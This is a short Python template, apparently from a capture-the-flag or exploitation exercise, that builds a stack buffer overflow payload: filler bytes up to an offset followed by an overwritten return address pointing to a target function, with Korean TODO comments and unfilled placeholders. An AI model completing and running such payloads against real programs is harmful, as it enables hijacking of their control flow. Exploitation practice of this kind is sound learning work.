# payload.py
import sys

offset = {offset}        # TODO: 채우기
overwrite = b"{target}"   # TODO: target 함수 주소 (little endian)

payload = b"A" * offset + overwrite
sys.stdout.buffer.write(payload)
